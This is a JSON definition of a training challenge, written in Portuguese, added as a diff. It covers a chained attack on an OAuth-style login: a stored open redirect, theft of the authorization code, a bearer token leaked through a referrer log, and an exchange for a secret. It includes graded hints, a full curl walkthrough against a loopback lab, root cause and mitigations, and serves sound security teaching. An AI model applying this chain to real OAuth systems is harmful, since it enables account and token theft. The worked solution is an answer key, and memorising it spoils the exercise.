@@ -1,0 +1,85 @@
+{
+  "slug": "chain-open-redirect-to-token-theft",
+  "title": "O registro de redirects",
+  "codename": "WAYPOINT SSO",
+  "summary": "O login no estilo OAuth do Waypoint armazena redirect URIs sem verificar seu host, então um authorization code pode ser entregue a uma página do atacante. O bearer token que vem em seguida vaza para o log de referrer, e um endpoint interno de captura o troca silenciosamente pelo segredo protegido.",
+  "category": "chain",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "chain-open-redirect-to-token-theft",
+  "estimated_minutes": 40,
+  "xp": 320,
+  "tech": [
+    "Flask",
+    "OAuth 2.0",
+    "Open redirect",
+    "Referrer leaks",
+    "Bearer tokens"
+  ],
+  "tags": [
+    "chaining",
+    "open-redirect",
+    "oauth",
+    "token-theft",
+    "referer-leak",
+    "stored-poisoning"
+  ],
+  "story": "O Waypoint opera o single sign-on do cliente Wayfinder Web. Seu authorization server mantém um registro de clients com uma allow-list de redirect URIs, mas qualquer valor que falhe na allow-list ainda é salvo como redirect 'pending' e usado na próxima autorização. Os tokens seguem o implicit flow em um fragmento de URL, e o script de analytics do cliente envia document.referrer via POST para um log de borda. Um endpoint interno há muito esquecido troca tokens de acesso pelo segredo de operações sem perguntar quem enviou o token.",
+  "objective": "Envenene o redirect do cliente para que o authorization code de um operador caia em uma página controlada pelo atacante, use o bearer token resultante vazado pelo log de referrer e troque-o no endpoint interno de captura pela flag.",
+  "rules": "Fique na origem loopback atribuída. As credenciais do operador de demonstração já estão preenchidas na tela de consentimento; o redirect que você registrar pode apontar para qualquer path na mesma origem do lab. Resete o lab para limpar redirects armazenados e logs. As flags são dinâmicas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do cofre de operações",
+      "flag_type": "root",
+      "points": 320,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Quem decide parasonde o code vai?",
+      "body": "O registro de clients em `/clients` rejeita hosts fora da allow-list, mas leia o que a página diz que faz com o valor rejeitado. Depois veja o que `/authorize` preenche como alvo do redirect.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "O fragmento não é segredo",
+      "body": "A página de callback guarda o token de acesso em `#access_token=...`. O servidor nunca vê um fragmento, mas o script de analytics do cliente envia `document.referrer` via POST para `/beacon` a cada carregamento de página. Aponte o callback para `/callback` e leia `/logs`.",
+      "cost": 25
+    },
+    {
+      "level": 3,
+      "title": "Mesa de câmbio",
+      "body": "Tire o token `wp_...` do log de referrer e entregue-o a `/capture?token=...`. O endpoint interno de troca de tokens não tem vínculo com o client e serve o recurso protegido daquele token.",
+      "cost": 35
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — open redirect armazenado.** `/clients` aceita uma redirect URI, verifica o host contra a allow-list e armazena valores que não batem como redirect *pending*, que `/authorize` usa imediatamente. Registre uma página do atacante na mesma origem:\n\n```bash\ncurl -s -X POST http://127.0.0.1:PORT/clients \\\n  -d 'client_id=wayfinder-web&redirect_uri=http://127.0.0.1:PORT/attacker'\n# Host not in the allow-list. The URI was saved as a pending redirect ...\ncurl -s http://127.0.0.1:PORT/authorize | grep 'name=\"redirect_uri\"'\n# value=\"http://127.0.0.1:PORT/attacker\"\n```\n\n**Etapa 2 — entrega do code.** A vítima autoriza; o redirect de consentimento leva o authorization code para a página do atacante:\n\n```bash\ncurl -s -i -X POST http://127.0.0.1:PORT/authorize \\\n  -d 'client_id=wayfinder-web&username=operator&password=Waypoint-2026!&redirect_uri=http://127.0.0.1:PORT/attacker'\n# meta refresh: 0;url=http://127.0.0.1:PORT/attacker?code=<CODE>\n```\n\n**Etapa 3 — troque o code por um token.** O atacante pede ao callback real que troque o code:\n\n```bash\ncurl -s 'http://127.0.0.1:PORT/callback?code=<CODE>'\n# history.replaceState(..., \"/callback#access_token=wp_...&token_type=bearer\")\n```\n\n**Etapa 4 — leia o log de referrer.** Os navegadores enviam `Referer: http://127.0.0.1:PORT/callback#access_token=wp_...` ao script de analytics, que o envia via POST para `/beacon`. No lado do servidor, reenvie esse POST (o log só se importa com o valor):\n\n```bash\ncurl -s -X POST http://127.0.0.1:PORT/beacon \\\n  --data-urlencode 'referrer=http://127.0.0.1:PORT/callback#access_token=wp_...&token_type=bearer' \\\n  -d 'source=callback-script'\ncurl -s http://127.0.0.1:PORT/logs | grep access_token\n```\n\n**Etapa 5 — troque o token.** `/capture` troca um token válido `flag:read` pelo segredo, uma única vez:\n\n```bash\ncurl -s 'http://127.0.0.1:PORT/capture?token=wp_...'\n# <pre>RV{...}</pre>\n```\n\nTrocar o mesmo token de novo retorna 403, então o objetivo é registrado exatamente uma vez: a captura mostra o token roubado e o cofre responde com a flag.",
+    "root_cause": "Quatro fraquezas independentes compõem a corrente. (1) O registro de clients armazena e ativa uma redirect URI que falhou na checagem de host, então qualquer origem pode se tornar o alvo do redirect OAuth. (2) O implicit flow coloca um bearer token em um fragmento de URL entregue a qualquer origem que o redirect indicar. (3) O cliente vaza document.referrer — que inclui o fragmento — para um log no servidor, transformando um token que só existia na URL em uma credencial armazenada legível por qualquer um. (4) O endpoint interno `/capture` aceita qualquer token válido e retorna o recurso protegido sem vincular o token ao client que o requisitou. Cada passo é sobrevivível sozinho; juntos, eles entregam o segredo de operações a um atacante não autenticado.",
+    "mitigation": "Compare redirect URIs contra uma allow-list exata por client e rejeite divergências em vez de armazená-las; nunca honre um redirect pending/não aprovado. Prefira o authorization-code flow com PKCE para clients públicos e mantenha tokens fora de URLs e headers de referrer (`Referrer-Policy: no-referrer` estrito, fragmentos nunca logados). Trate o Referer como dado controlado pelo atacante e nunca o persista junto com credenciais. Vincule endpoints de captura/troca à autenticação de client, uso único, TTL curto e checagem de audience; registre e alerte sobre uso de token em contextos inesperados."
+  },
+  "references": [
+    {
+      "title": "OWASP — Unvalidated Redirects and Forwards Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Por que a validação por allow-list dos alvos de redirect deve rejeitar, e não postergar, e como open redirects são abusados."
+    },
+    {
+      "title": "OAuth 2.0 Security Best Current Practice — RFC 9700",
+      "url": "https://www.rfc-editor.org/rfc/rfc9700.html",
+      "source_type": "standard",
+      "description": "Correspondência exata de redirect URI, PKCE, depreciação do implicit flow e orientação sobre vazamento de token para authorization servers."
+    },
+    {
+      "title": "PortSwigger Web Security Academy — OAuth 2.0 authentication vulnerabilities",
+      "url": "https://portswigger.net/web-security/oauth",
+      "source_type": "official",
+      "description": "Manipulação de redirect URI, roubo de token via redirects e padrões de vazamento de token de acesso."
+    }
+  ]
+}
